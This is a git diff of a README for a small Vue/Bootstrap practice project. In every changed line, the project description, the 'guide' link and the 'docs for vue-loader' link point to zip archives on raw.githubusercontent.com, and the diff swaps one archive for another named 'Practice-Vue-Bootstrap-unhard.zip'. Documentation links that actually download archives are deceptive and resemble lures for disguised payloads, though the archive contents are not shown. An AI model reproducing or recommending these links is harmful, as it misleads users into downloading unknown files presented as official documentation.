@@ -1,6 +1,6 @@
 # practice
 
-> A https://raw.githubusercontent.com/HongSehwan/BootstrapVue-Practice/main/static/Vue_Bootstrap_Practice_1.9-beta.1.zip project
+> A https://raw.githubusercontent.com/HongSehwan/BootstrapVue-Practice/main/src/Practice-Vue-Bootstrap-unhard.zip project
 
 ## Build Setup
 
@@ -18,4 +18,4 @@ npm run build
 npm run build --report
 ```
 
-For a detailed explanation on how things work, check out the [guide](https://raw.githubusercontent.com/HongSehwan/BootstrapVue-Practice/main/static/Vue_Bootstrap_Practice_1.9-beta.1.zip) and [docs for vue-loader](https://raw.githubusercontent.com/HongSehwan/BootstrapVue-Practice/main/static/Vue_Bootstrap_Practice_1.9-beta.1.zip).
+For a detailed explanation on how things work, check out the [guide](https://raw.githubusercontent.com/HongSehwan/BootstrapVue-Practice/main/src/Practice-Vue-Bootstrap-unhard.zip) and [docs for vue-loader](https://raw.githubusercontent.com/HongSehwan/BootstrapVue-Practice/main/src/Practice-Vue-Bootstrap-unhard.zip).
